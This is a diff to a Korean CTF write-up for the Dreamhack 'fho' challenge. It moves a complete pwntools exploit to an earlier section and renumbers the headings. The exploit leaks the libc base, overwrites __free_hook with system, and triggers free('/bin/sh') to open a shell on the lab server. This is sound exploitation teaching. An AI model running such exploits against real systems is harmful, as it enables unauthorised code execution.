@@ -54,7 +54,48 @@ int main() {
 - **[2]** `*addr = value` — 원하는 주소에 원하는 값을 쓰는 **임의 주소 쓰기**
 - **[3]** `free(addr)` — 원하는 주소를 넘기는 **임의 주소 free**
 
-### 4. libc leak — `%s`로 스택에서 주소 꺼내기
+### 4. 익스플로잇 코드
+
+<p align="center">
+  <img src="assets/fho/exploit.png" width="560" alt="libc를 leak해 __free_hook을 system으로 덮고 free로 트리거하는 pwntools 코드" />
+</p>
+
+```python
+#!/usr/bin/env python3
+from pwn import *
+
+p = remote("host3.dreamhack.games", 21177)
+e = ELF('./fho')
+libc = ELF('./libc-2.27.so')
+
+# [1] Leak libc base
+buf = b'A'*0x48
+p.sendafter('Buf: ', buf)
+p.recvuntil(buf)
+libc_start_main_xx = u64(p.recvline()[:-1] + b'\x00'*2)
+libc_base = libc_start_main_xx - (libc.symbols['__libc_start_main'] + 231)
+system    = libc_base + libc.symbols['system']
+free_hook = libc_base + libc.symbols['__free_hook']
+binsh     = libc_base + next(libc.search(b'/bin/sh'))
+
+# [2] Overwrite __free_hook with system
+p.recvuntil('To write: ')
+p.sendline(str(free_hook).encode())
+p.recvuntil('With: ')
+p.sendline(str(system).encode())
+
+# [3] free("/bin/sh") → system("/bin/sh")
+p.recvuntil('To free: ')
+p.sendline(str(binsh).encode())
+
+p.interactive()
+```
+
+> `fho`, `libc-2.27.so`는 실행 폴더에 있어야 하고, libc는 준 `libc-2.27.so`가 서버 버전이라 그대로 맞는다.
+
+아래는 이 코드의 [1] libc leak, 그리고 [2][3]이 `__free_hook`을 system으로 바꿔 셸을 여는 과정을 본 것이다.
+
+### 5. libc leak — `%s`로 스택에서 주소 꺼내기
 
 앞선 문제들(basic_rop, got_overwrite)은 `write`나 `puts`로 **GOT에 있는 함수 주소를 직접 출력**시켜 leak했다. 이 문제는 그런 출력 수단이 없고 `printf("Buf: %s\n", buf)` 하나뿐이라, **주소를 바로 볼 수가 없다.**
 
@@ -99,7 +140,7 @@ binsh     = libc_base + next(libc.search(b'/bin/sh'))
 
 231은 `__libc_start_main` 안에서 `call main` 다음 명령까지의 오프셋이고 libc 버전마다 다르다. `libc.libc_start_main_return`을 쓰면 버전에 안 묶인다.
 
-### 5. 익스플로잇 — `__free_hook`을 `system`으로
+### 6. 익스플로잇 — `__free_hook`을 `system`으로
 
 glibc의 `free()`는 호출될 때 `__free_hook`에 값이 있으면 원래 free 대신 **`__free_hook(ptr)`를 부른다.** 따라서 `__free_hook`에 `system`을 써두고 `free("/bin/sh")`를 호출하면 `system("/bin/sh")`이 된다.
 
@@ -120,44 +161,7 @@ p.sendline(str(binsh).encode())       # To free:  free할 주소 = "/bin/sh"
 
 **포인터 변수 `addr`의 동작:** `addr`는 지역 포인터 변수다. [2]에서 `addr = free_hook`로 두고 `*addr = value`를 실행하면 **`__free_hook` 메모리에 system이 기록되고, 이 쓰기는 끝난다.** [3]에서 `addr = binsh`로 다시 받는 것은 **변수 값만 바꾸는 것**이라, 앞서 `__free_hook`에 써둔 값은 그대로 남는다. 같은 변수를 [2]에서는 "쓸 주소", [3]에서는 "free할 주소"로 재사용할 뿐이다.
 
-<p align="center">
-  <img src="assets/fho/exploit.png" width="560" alt="libc를 leak해 __free_hook을 system으로 덮고 free로 트리거하는 pwntools 코드" />
-</p>
-
-```python
-#!/usr/bin/env python3
-from pwn import *
-
-p = remote("host3.dreamhack.games", 21177)
-e = ELF('./fho')
-libc = ELF('./libc-2.27.so')
-
-# [1] Leak libc base
-buf = b'A'*0x48
-p.sendafter('Buf: ', buf)
-p.recvuntil(buf)
-libc_start_main_xx = u64(p.recvline()[:-1] + b'\x00'*2)
-libc_base = libc_start_main_xx - (libc.symbols['__libc_start_main'] + 231)
-system    = libc_base + libc.symbols['system']
-free_hook = libc_base + libc.symbols['__free_hook']
-binsh     = libc_base + next(libc.search(b'/bin/sh'))
-
-# [2] Overwrite __free_hook with system
-p.recvuntil('To write: ')
-p.sendline(str(free_hook).encode())
-p.recvuntil('With: ')
-p.sendline(str(system).encode())
-
-# [3] free("/bin/sh") → system("/bin/sh")
-p.recvuntil('To free: ')
-p.sendline(str(binsh).encode())
-
-p.interactive()
-```
-
-> `fho`, `libc-2.27.so`는 실행 폴더에 있어야 하고, libc는 준 `libc-2.27.so`가 서버 버전이라 그대로 맞는다.
-
-### 6. 실행 결과
+### 7. 실행 결과
 
 leak으로 libc base를 구하고, `__free_hook`을 system으로 덮은 뒤 `free`로 셸을 열어 `cat flag`로 FLAG를 획득한다.
 
